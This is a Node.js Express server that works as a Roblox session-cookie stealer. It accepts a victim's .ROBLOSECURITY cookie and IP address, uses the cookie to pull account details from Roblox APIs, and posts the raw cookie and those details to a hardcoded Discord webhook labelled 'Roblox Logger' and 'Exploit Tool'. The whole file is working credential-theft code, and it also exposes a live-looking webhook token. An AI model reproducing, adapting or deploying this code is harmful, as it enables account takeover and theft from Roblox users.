const express = require("express");
const cors = require("cors");
const fetch = require("node-fetch");

const app = express();
app.use(cors());
app.use(express.json());

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1393233820685434921/3aIHe5IE3Q23BYDwW_J6Q6jcLEPo2SP7Okqbo4cGepA4_Yk6ngHpYkhCu46E2XNjGcrF";

// Root route
app.get("/", (req, res) => {
  res.send("✅ Local server is running!");
});

app.get("/fetchRobloxLoot", async (req, res) => {
  const { cookie, ip } = req.query;

  if (!cookie || typeof cookie !== "string" || cookie.length < 100) {
    return res.status(400).json({ success: false, error: "❌ Invalid or missing .ROBLOSECURITY cookie" });
  }

  try {
    const now = new Date().toLocaleString();

    // Step 1: Fetch Roblox user info
    const robloxRes = await fetch("https://www.roblox.com/mobileapi/userinfo", {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
      },
    });

    if (!robloxRes.ok) {
      throw new Error("Failed to fetch user info from Roblox.");
    }

    const userData = await robloxRes.json();

    const username = userData.UserName || "Unknown";
    const userId = userData.UserID || "Unknown";
    const isPremium = userData.IsPremium ? "Yes" : "No";

    // Step 2: Fetch account age
    const accountRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
      },
    });

    if (!accountRes.ok) {
      throw new Error("Failed to fetch account data.");
    }

    const accountData = await accountRes.json();
    const accountAge = accountData.age || "Unknown";

    // Step 3: Format Discord message
    const content = [
      "🔑 New Roblox Cookie Captured",
      "",
      `📡 IP Address: ${ip || "Unknown"}`,
      `🕓 Time: ${now}`,
      "",
      `👤 Username: ${username}`,
      `🆔 User ID: ${userId}`,
      `🎂 Account Age: ${accountAge} days`,
      `💎 Premium: ${isPremium}`,
      "",
      "🧩 .ROBLOSECURITY:",
      "```",
      cookie,
      "```",
      "",
      "Sent from Exploit Tool"
    ].join("\n");

    // Step 4: Send to Discord webhook
    const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "Roblox Logger",
        content: content,
      }),
    });

    if (!discordRes.ok) {
      throw new Error("❌ Failed to send to Discord webhook");
    }

    return res.json({ success: true, message: "✅ Cookie and user data sent to Discord!" });

  } catch (e) {
    console.error("Error:", e);
    return res.status(500).json({ success: false, error: e.message });
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server listening on port ${PORT}`);
});
